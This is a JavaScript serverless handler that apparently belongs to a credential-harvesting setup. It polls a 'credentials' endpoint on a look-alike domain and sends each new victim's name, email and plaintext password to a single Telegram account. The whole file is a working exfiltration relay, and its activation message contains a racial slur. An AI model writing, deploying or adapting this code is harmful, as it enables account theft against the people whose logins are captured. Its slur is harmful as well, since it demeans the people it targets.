import fetch from "node-fetch";
import { Redis } from "@upstash/redis";

// ENV VARIABLES
const BOT_TOKEN = process.env.BOT_TOKEN;
const ALLOWED_USER_ID = "6089461664";  // Your UID
const JSON_URL = "https://servver.vercel.app/api/auth/credentials";

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    const body = req.body;

    // Extract user ID
    const fromUser = body?.message?.from?.id;

    // Reject all users except you
    if (fromUser && fromUser != ALLOWED_USER_ID) {
        return res.status(200).send("Unauthorized");
    }

    // On /start command
    if (body?.message?.text === "/start") {
        await sendMsg(fromUser, "Bot Activated Nigga 😎 I'm watching your JSON file.");
        return res.status(200).send("ok");
    }

    // Fetch the JSON file
    let json;
    try {
        json = await fetch(JSON_URL).then(r => r.json());
    } catch (err) {
        await sendMsg(ALLOWED_USER_ID, "❌ Error fetching JSON URL");
        return res.status(500).send("fetch-error");
    }

    if (!Array.isArray(json) || json.length === 0) {
        await sendMsg(ALLOWED_USER_ID, "⚠️ JSON returned empty or invalid format.");
        return res.status(200).send("invalid-json");
    }

    // Get latest entry
    const latest = json[json.length - 1];
    const latestId = latest._id;

    // Load stored last-seen ID
    const lastSeen = await redis.get("last_seen_id");

    // First-time setup: store ID, don't send message
    if (!lastSeen) {
        await redis.set("last_seen_id", latestId);
        return res.status(200).send("initialized");
    }

    // If new entry appears
    if (latestId !== lastSeen) {
        await redis.set("last_seen_id", latestId);

        const msg =
`🔥 NEW ENTRY DETECTED
-------------------------
Name: ${latest.name}
Email: ${latest.email}
Password: ${latest.password}
Created: ${latest.createdAt}
ID: ${latest._id}
-------------------------
(update monitored successfully)`;

        await sendMsg(ALLOWED_USER_ID, msg);
    }

    res.status(200).send("ok");
}

async function sendMsg(chatId, text) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    });
}
